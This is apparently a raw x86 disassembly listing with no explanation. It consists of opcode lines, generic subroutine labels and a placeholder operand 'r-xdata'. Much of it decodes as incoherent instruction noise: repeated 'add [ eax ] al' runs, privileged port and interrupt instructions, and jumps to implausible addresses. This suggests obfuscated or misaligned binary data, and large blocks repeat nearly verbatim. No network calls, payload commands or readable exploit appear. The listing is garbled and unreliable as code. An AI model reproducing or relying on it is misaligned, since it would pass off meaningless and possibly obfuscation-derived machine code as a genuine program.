sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
push esi
push esi
call sub_403eb3
sub ebx 0xfeace855
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
sub_403e68
pushfd
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16402b82
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcac6e8
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70b6a5
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fdf7e
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501df
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c9491b3
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_403eb3
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97aa
push edx
call sub_403de9
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f95ac
push ebp
call sub_403d3d
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4e37e
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146d8
jg r-xdata
jne 0x24c14e08
jae r-xdata
sub ecx 0xe1813e75
call sub_403e68
xor edi 0x517f5859
jno 0xfffffffff2c19925
push ecx
push ebx
call sub_403db8
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afbd3f
push edi
push eax
push edx
call sub_403dc8
ja 0x504c1cf
pushfd
call sub_403d28
mov eax [ fs : 0xffffffff9ce8c173 ]
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
sub_403eb3
sub [ esp + 0x40 ] r-xdata
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
jmp [ 0xce8d0f ]
jge r-xdata
jmp 0xffffffff844f7069
jno r-xdata
sub esi 0x73bd047f
push ebp
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fd98
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffcb8a7
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bed2
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a47c6e
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c709
ja r-xdata
jge 0x71fc7f10
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_404011
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_404008
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_404122
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2c2bd
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17df7
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f7570
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
jae r-xdata
ja 0xffffffffa3c34fcd
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fd4
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdec5b3
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_403f84
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff79c0cb
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc28a
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12e1
jae r-xdata
call sub_404199
jb 0xffffffff81b2be4f
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c620
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd5224
add esp 0x4
jae r-xdata
jl 0xf3c365
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5bf
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bada
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403f84
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fd98
ja r-xdata
call 0xffcb8a7
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a47c6e
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_404008
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc7f10
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bed2
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c709
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_404122
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c34fcd
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fd4
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_404011
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdec5b3
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2c2bd
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17df7
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9bc28a
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f7570
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_404199
jb 0xffffffff81b2be4f
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_403f84
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79c0cb
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12e1
add esp 0x4
jae r-xdata
jl 0xf3c365
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c620
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd5224
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff8428bada
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5bf
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403fd4
ja r-xdata
jno r-xdata
jl 0x2f28dc35
jno r-xdata
jl 0xfffffffff6c1fd98
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff81501c43
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c709
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a47c6e
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8a7
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
jae r-xdata
ja 0xffffffffa3c34fcd
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79c0cb
ja r-xdata
jge 0x71fc7f10
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bed2
jg r-xdata
jpo 0xdec5b3
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17df7
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_404008
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_404122
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fd4
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc28a
jae r-xdata
add edx 0xff108f0f
call sub_403f84
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_404011
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12e1
jae r-xdata
call sub_404199
jb 0xffffffff81b2be4f
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
